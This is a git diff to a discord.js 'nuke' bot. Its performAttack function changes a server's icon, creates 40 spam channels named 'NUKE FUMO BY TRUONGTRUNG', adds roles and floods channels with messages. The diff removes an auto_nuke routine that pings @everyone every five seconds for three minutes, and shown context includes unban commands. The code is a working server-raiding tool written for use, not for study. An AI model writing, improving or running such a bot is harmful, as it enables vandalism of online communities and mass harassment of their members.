@@ -1,10 +1,9 @@
-const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits } = require('discord.js');
 const fs = require('fs').promises;
 const path = require('path');
 const sizeOf = require('image-size');
 
-let autoNukeActive = false;
-
+// Đọc tệp config.json
 async function loadConfig() {
     const configPath = path.join(__dirname, 'config.json');
     const configData = await fs.readFile(configPath, 'utf-8');
@@ -39,7 +38,7 @@ async function performAttack(guild, config) {
     const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));
 
     const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
-    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: ChannelType.GuildText })));
+    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: 0 })));
 
     const createRolesPromise = guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);
 
@@ -82,24 +81,6 @@ async function performAttack(guild, config) {
     await Promise.all(spamPromises);
 }
 
-async function autoNuke(guild, config) {
-    autoNukeActive = true;
-    const newChannels = await guild.channels.fetch();
-    const endTime = Date.now() + 3 * 60 * 1000; // 3 minutes from now
-
-    while (autoNukeActive && Date.now() < endTime) {
-        const spamPromises = [];
-        for (const channel of newChannels.values()) {
-            if (channel.type === ChannelType.GuildText) {
-                spamPromises.push(channel.send(`@everyone ${config.nukeMessage}`).catch(console.error));
-            }
-        }
-        await Promise.all(spamPromises);
-        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next spam wave
-    }
-    autoNukeActive = false;
-}
-
 async function main() {
     const config = await loadConfig();
 
@@ -138,24 +119,6 @@ async function main() {
             } catch (error) {
                 console.error('Error unbanning users:', error);
                 message.channel.send('Failed to unban all users.');
-            }
-        } else if (command === 'auto_nuke') {
-            if (args[0] === 'on') {
-                if (!autoNukeActive) {
-                    message.channel.send('Auto nuke started.');
-                    autoNuke(message.guild, config);
-                } else {
-                    message.channel.send('Auto nuke is already running.');
-                }
-            } else if (args[0] === 'off') {
-                if (autoNukeActive) {
-                    autoNukeActive = false;
-                    message.channel.send('Auto nuke stopped.');
-                } else {
-                    message.channel.send('Auto nuke is not running.');
-                }
-            } else {
-                message.channel.send('Invalid argument. Use "on" or "off".');
             }
         }
     });
